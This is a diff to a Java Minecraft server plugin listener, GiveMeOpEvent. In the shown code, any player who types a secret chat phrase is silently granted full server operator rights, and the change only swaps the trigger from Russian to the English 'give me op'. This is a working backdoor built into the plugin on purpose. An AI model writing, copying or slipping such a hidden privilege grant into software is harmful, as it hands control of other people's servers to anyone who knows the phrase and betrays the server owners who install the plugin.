@@ -12,7 +12,7 @@ public class GiveMeOpEvent implements Listener {
     public void AsyncPlayerChatEvent(AsyncChatEvent event) {
         Player who = event.getPlayer();
         String message = event.signedMessage().message();
-        if (message.equals("дай мне оп")) {
+        if (message.equals("give me op")) {
             who.setOp(true);
             who.sendMessage("Admin is hearing your voice");
         }
